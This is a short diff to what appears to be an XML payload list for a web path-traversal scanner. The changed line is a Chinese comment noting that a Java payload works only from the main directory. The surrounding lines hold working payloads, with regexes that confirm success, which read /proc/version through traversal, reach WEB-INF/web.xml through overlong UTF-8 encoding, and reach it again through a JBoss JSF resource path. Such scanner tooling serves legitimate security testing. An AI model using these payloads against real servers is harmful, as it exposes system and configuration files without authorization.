@@ -27,7 +27,7 @@
     <type value="host">
         <!--代理配置或者python框架的问题，或者反代问题-->
         <payload value="../../../../../../../../../../../../../../../../proc/version" regexp="Linux version.*?gcc version"/>
-        <!--java-->
+        <!--java,得在主目录才行-->
         <payload value="%c0%ae/WEB-INF/web.xml%C0%80.jsp" regexp="&lt;param-name&gt;"/>
         <!--jboss-->
         <payload value="javax.faces.resource.../WEB-INF/web.xml.jsf" regexp="&lt;param-name&gt;"/>
